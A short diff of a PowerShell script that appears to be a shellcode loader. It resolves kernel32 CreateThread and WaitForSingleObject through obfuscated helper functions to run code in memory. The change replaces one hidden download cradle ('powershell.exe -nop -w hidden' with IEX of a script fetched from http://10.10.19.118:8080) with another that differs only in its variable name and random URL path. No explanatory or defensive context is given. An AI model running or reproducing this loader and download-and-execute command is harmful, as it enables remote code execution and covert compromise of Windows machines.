@@ -27,4 +27,4 @@ $lr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((v
 $mfd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vr0n4 kernel32.dll CreateThread), (iC @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lr,[IntPtr]::Zero,0,[IntPtr]::Zero)
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vr0n4 kernel32.dll WaitForSingleObject), (iC @([IntPtr], [Int32]))).Invoke($mfd,0xffffffff) | Out-Null
 
-powershell.exe -nop -w hidden -c $a=new-object net.webclient;$a.proxy=[Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $a.downloadstring('http://10.10.19.118:8080/vvQcOgMdBJi');
+powershell.exe -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $x.downloadstring('http://10.10.19.118:8080/CU5A036dDNMV');
